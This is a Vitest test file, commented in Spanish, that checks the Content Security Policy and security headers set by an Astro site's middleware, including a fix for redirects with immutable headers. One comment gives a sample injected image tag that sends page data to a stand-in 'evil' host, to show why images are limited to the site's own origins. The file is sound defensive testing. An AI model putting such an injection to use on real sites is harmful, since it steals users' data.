import type { APIContext } from 'astro';
import { beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * La CSP es la segunda barrera del sitio: si alguna vez vuelve a colarse una
 * inyección de HTML, es lo que decide si además ejecuta, exfiltra o desfigura.
 * Estos tests fijan las tres propiedades que la hacen valer: nada inline sin
 * nonce, ningún destino abierto, y ninguna familia de respuestas sin política.
 *
 * Cubren la política, no el HTML que debe respetarla: que el build no incruste
 * scripts inline —que la política declara imposibles— solo se ve tras `astro
 * build`, y lo verifica `scripts/verificar-scripts-inline.mjs`.
 */

vi.mock('@lib/auth/servidor', async (importarOriginal) => ({
  ...(await importarOriginal<typeof import('../../src/lib/auth/servidor')>()),
  AUTH_CONFIGURADA: false,
  tieneCookieSesion: () => false,
}));

const { CSP_NO_DOCUMENTO, cspDocumento, onRequest } = await import('../../src/middleware');

function contexto(ruta = '/avisos'): APIContext {
  const url = new URL(`https://carflip.cl${ruta}`);
  return {
    url,
    request: new Request(url),
    locals: {},
    cookies: {},
    redirect: (destino: string, estado = 302) =>
      new Response(null, { status: estado, headers: { location: destino } }),
  } as unknown as APIContext;
}

const respuestaCon = (contentType: string) => async () =>
  new Response('contenido', { headers: { 'content-type': contentType } });

async function cspDe(contentType: string, ruta?: string) {
  const ctx = contexto(ruta);
  const respuesta = await onRequest(ctx, respuestaCon(contentType) as never);
  return {
    csp: respuesta!.headers.get('content-security-policy') ?? '',
    respuesta: respuesta!,
    nonce: (ctx.locals as { nonce?: string }).nonce ?? '',
  };
}

const directiva = (csp: string, nombre: string): string =>
  csp
    .split('; ')
    .find((d) => d.startsWith(`${nombre} `))
    ?.slice(nombre.length + 1) ?? '';

describe('CSP de los documentos HTML', () => {
  // La política de producción: es la que importa, y en desarrollo Vite sirve el
  // CSS en un <style> que no se puede noncear.
  const csp = cspDocumento('abc123');
  let nonce = '';

  beforeEach(async () => {
    ({ nonce } = await cspDe('text/html'));
  });

  it('permite los scripts inline solo por nonce, nunca por unsafe-inline', async () => {
    expect(nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(directiva(csp, 'script-src')).toBe("'self' 'nonce-abc123'");
    expect(directiva((await cspDe('text/html')).csp, 'script-src')).toContain("'nonce-");

    // `'unsafe-inline'` solo puede aparecer en style-src-attr, que es la única
    // directiva a la que la especificación no le permite nonce.
    const conInline = csp
      .split('; ')
      .filter((d) => d.includes("'unsafe-inline'"))
      .map((d) => d.split(' ')[0]);
    expect(conInline).toEqual(['style-src-attr']);
  });

  it('usa un nonce distinto en cada request', async () => {
    const otro = await cspDe('text/html');
    expect(otro.nonce).not.toBe(nonce);
  });

  it('bloquea las hojas de estilo inline y solo deja los atributos style', () => {
    // Un `<style>` inyectado permite exfiltrar por CSS y desfigurar; los `style=`
    // con valores calculados de /dashboard y /mercado no admiten nonce.
    expect(directiva(csp, 'style-src')).toBe("'self'");
    expect(directiva(csp, 'style-src-attr')).toBe("'unsafe-inline'");
  });

  it('solo en desarrollo admite la hoja inline que inyecta Vite', () => {
    expect(directiva(cspDocumento('abc123', true), 'style-src')).toBe("'self' 'unsafe-inline'");
    // La excepción no se extiende a los scripts ni en desarrollo.
    expect(directiva(cspDocumento('abc123', true), 'script-src')).toBe("'self' 'nonce-abc123'");
  });

  it('acota img-src a los orígenes propios en vez de a cualquier https', () => {
    // `img-src ... https:` es un canal de exfiltración: <img src="https://evil/?d=…">
    const img = directiva(csp, 'img-src');
    expect(img).toContain("'self'");
    expect(img).toContain('data:');
    expect(img.split(' ')).not.toContain('https:');
  });

  it('cierra el resto de los vectores del documento', () => {
    expect(directiva(csp, 'default-src')).toBe("'self'");
    expect(directiva(csp, 'frame-ancestors')).toBe("'none'");
    expect(directiva(csp, 'object-src')).toBe("'none'");
    expect(directiva(csp, 'base-uri')).toBe("'self'");
    expect(directiva(csp, 'form-action')).toBe("'self'");
    expect(directiva(csp, 'connect-src')).toBe("'self'");
  });

  it('declara la codificación en la cabecera, no solo en el <meta>', async () => {
    const { respuesta } = await cspDe('text/html');
    expect(respuesta.headers.get('content-type')).toBe('text/html; charset=utf-8');
  });
});

describe('CSP de las respuestas que no son documentos', () => {
  it('el sitemap y los endpoints también llevan política', async () => {
    for (const tipo of ['application/xml', 'application/json', 'text/plain']) {
      const { csp } = await cspDe(tipo, '/sitemap-avisos.xml');
      expect(csp).toBe(CSP_NO_DOCUMENTO);
      expect(csp).toContain("default-src 'none'");
    }
  });

  it('no les inventa un nonce ni les toca el content-type', async () => {
    const { csp, respuesta } = await cspDe('application/xml', '/sitemap-avisos.xml');
    expect(csp).not.toContain('nonce-');
    expect(respuesta.headers.get('content-type')).toBe('application/xml');
  });
});

describe('cabeceras de seguridad comunes', () => {
  it('van en toda respuesta, sea documento o no', async () => {
    for (const tipo of ['text/html', 'application/xml']) {
      const { respuesta } = await cspDe(tipo);
      expect(respuesta.headers.get('x-content-type-options')).toBe('nosniff');
      expect(respuesta.headers.get('referrer-policy')).toBe('strict-origin-when-cross-origin');
      expect(respuesta.headers.get('x-frame-options')).toBe('DENY');
    }
  });
});

/**
 * `Response.redirect()` nace con el guard de cabeceras en "immutable": escribirle
 * encima lanza. Como el middleware se las escribe a toda respuesta, el endpoint
 * de /contacto tumbaba cada envío del formulario con un 500 (issue #45), y los
 * tests no lo vieron porque ninguno pasaba una respuesta así por `onRequest`.
 */
describe('respuestas que llegan con las cabeceras inmutables', () => {
  const DESTINO = 'https://carflip.cl/contacto?error=1';
  const redireccion = async () => Response.redirect(DESTINO, 303);
  const pasarPorMiddleware = async () =>
    (await onRequest(contexto('/api/contacto'), redireccion as never))!;

  it('no tumban el request, y conservan estado y destino', async () => {
    const respuesta = await pasarPorMiddleware();

    expect(respuesta.status).toBe(303);
    expect(respuesta.headers.get('location')).toBe(DESTINO);
  });

  it('salen igual con las cabeceras de seguridad: la invariante no admite excepciones', async () => {
    const respuesta = await pasarPorMiddleware();

    expect(respuesta.headers.get('x-content-type-options')).toBe('nosniff');
    expect(respuesta.headers.get('referrer-policy')).toBe('strict-origin-when-cross-origin');
    expect(respuesta.headers.get('x-frame-options')).toBe('DENY');
    expect(respuesta.headers.get('content-security-policy')).toBe(CSP_NO_DOCUMENTO);
  });
});
